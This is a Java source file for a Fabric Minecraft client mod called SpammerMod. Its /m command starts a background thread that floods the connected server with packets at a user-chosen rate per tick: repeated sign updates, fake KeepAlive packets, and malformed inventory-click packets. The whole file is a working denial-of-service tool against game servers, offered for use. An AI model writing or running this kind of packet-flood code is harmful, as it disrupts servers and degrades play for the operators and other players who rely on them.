package com.example.spammer;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.command.CommandRegistryAccess;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.text.Text;
import net.minecraft.util.math.BlockPos;

import java.util.*;

public class SpammerMod implements ClientModInitializer {

    private final MinecraftClient mc = MinecraftClient.getInstance();
    private final Set<Integer> activeModes = new HashSet<>();
    private int packetsPerTick = 1;
    private boolean enabled = false;

    @Override
    public void onInitializeClient() {
        registerCommands();

        new Thread(() -> {
            while (true) {
                if (enabled && mc.player != null && mc.getNetworkHandler() != null) {
                    for (int i = 0; i < packetsPerTick; i++) {
                        for (int mode : activeModes) {
                            switch (mode) {
                                case 1 -> spamSign();
                                case 2 -> spamSignAtPlayer();
                                case 3 -> spamKeepAlive();
                                case 4 -> spamClickExc();
                                case 5 -> spamInvalidPacket();
                            }
                        }
                    }
                }
                try {
                    Thread.sleep(50); // ~1 tick
                } catch (InterruptedException ignored) {}
            }
        }).start();
    }

    private void registerCommands() {
        ClientCommandManager.DISPATCHER.register(
            ClientCommandManager.literal("m")
                .executes(ctx -> {
                    mc.player.sendMessage(Text.literal("""
                        §aAvailable Methods:
                        §61. Spam Sign
                        §62. Spam Sign Near Player
                        §63. Spam Alive Packet
                        §64. Spam ClickExc
                        §65. Spam Invalid Packet
                        §7Use §b/m 1 2§7 or §b/m all§7 or §b/m stop§7 or §b/m r 10
                    """), false);
                    return 1;
                })
                .then(ClientCommandManager.literal("stop").executes(ctx -> {
                    enabled = false;
                    activeModes.clear();
                    mc.player.sendMessage(Text.literal("§cStopped all spamming."), false);
                    return 1;
                }))
                .then(ClientCommandManager.literal("all").executes(ctx -> {
                    enabled = true;
                    activeModes.addAll(Arrays.asList(1, 2, 3, 4, 5));
                    mc.player.sendMessage(Text.literal("§aStarted all spam methods."), false);
                    return 1;
                }))
                .then(ClientCommandManager.literal("r")
                    .then(ClientCommandManager.argument("rate", IntegerArgumentType.integer(1))
                        .executes(ctx -> {
                            int rate = IntegerArgumentType.getInteger(ctx, "rate");
                            packetsPerTick = rate;
                            mc.player.sendMessage(Text.literal("§aSet packets per tick to: " + rate), false);
                            return 1;
                        })
                    )
                )
                .then(ClientCommandManager.argument("modes", StringArgumentType.greedyString())
                    .executes(ctx -> {
                        String input = StringArgumentType.getString(ctx, "modes");
                        activeModes.clear();
                        enabled = true;
                        for (String s : input.split(" ")) {
                            try {
                                int id = Integer.parseInt(s);
                                if (id >= 1 && id <= 5) activeModes.add(id);
                            } catch (NumberFormatException ignored) {}
                        }
                        mc.player.sendMessage(Text.literal("§aStarted modes: " + activeModes), false);
                        return 1;
                    })
                )
        );
    }

    private void spamSign() {
        BlockPos pos = new BlockPos(0, 100, 0); // arbitrary position
        ClientPlayNetworking.send(new UpdateSignC2SPacket(pos, new String[]{
            "bella", "bella", "bella", "bella"
        }));
    }

    private void spamSignAtPlayer() {
        BlockPos pos = mc.player.getBlockPos();
        ClientPlayNetworking.send(new UpdateSignC2SPacket(pos, new String[]{
            "bella", "bella", "bella", "bella"
        }));
    }

    private void spamKeepAlive() {
        ClientPlayNetworking.send(new KeepAliveC2SPacket(0L));
    }

    private void spamClickExc() {
        ClientPlayNetworking.send(new ClickSlotC2SPacket(
            0, 0, 0, 1,
            mc.player.getMainHandStack(),
            Collections.emptyList(),
            mc.player.currentScreenHandler.getNextActionId(mc.player)
        ));
    }

    private void spamInvalidPacket() {
        ItemStack fakeItem = new ItemStack(Items.APPLE);
        ClientPlayNetworking.send(new ClickSlotC2SPacket(
            0, -1, 1, 1,
            fakeItem,
            Collections.emptyList(),
            mc.player.currentScreenHandler.getNextActionId(mc.player)
        ));
    }
}
